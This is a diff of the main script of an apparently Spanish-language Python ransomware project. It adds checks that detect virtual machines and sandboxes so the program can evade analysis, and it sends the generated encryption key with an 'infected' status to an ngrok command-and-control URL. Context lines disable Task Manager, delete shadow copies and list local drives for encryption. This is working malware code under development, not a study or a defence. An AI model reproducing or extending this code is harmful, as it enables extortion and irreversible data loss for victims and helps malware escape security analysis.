@@ -20,20 +20,23 @@ import sys
 
 if __name__ == '__main__':
     print("Executing encryption protocol")
-    cm = CryptoManager(action='encrypt')
-    # Punto 1) Enviar peticion al servidor utilizando la api restful
-    cm.save_key_as_file()
 
-    # TODO necesitamos no crear nada antes de detectar si estamos ejecutando en un windows o en una virtual machine
-    if not cm.is_windows():
-        print('Nothing to do here')
-        # cleanup protocol here
+    # Algunas comprobaciones antes de iniciar el protocolo
+    ved = VirtualEnvironmentDetector(dodelay=False)
+    
+    if not ved.is_windows():
+        print('Nothing to do here...')
         sys.exit()
 
-    ved = VirtualEnvironmentDetector()
-    if ved.neo_takes_blue_pill():
+    if ved.neo_takes_blue_pill(tolerance=0):
         print('Exiting the matrix...')
         sys.exit()
+
+    if ved.delay_anti_cuckoo(5*60):
+        print("We are being analyzed...")
+        sys.exit()
+
+    cm = CryptoManager(action='encrypt')
 
     # TODO try except needed
     # WORKING PROPERLY
@@ -41,7 +44,9 @@ if __name__ == '__main__':
     cm.delete_shadowcopies()
     print("Task manager disbled and shadow copies eliminated")
 
-    sys.exit() # Borrar
+    # File encryption here
+    cm.send_post_request(url='http://4b91c7321c2a.ngrok.io', key=cm.key, state='infected')
+    # cm.save_key_as_file() # Uncomment this if needed
 
     local_drives = cm.get_local_drives()
     
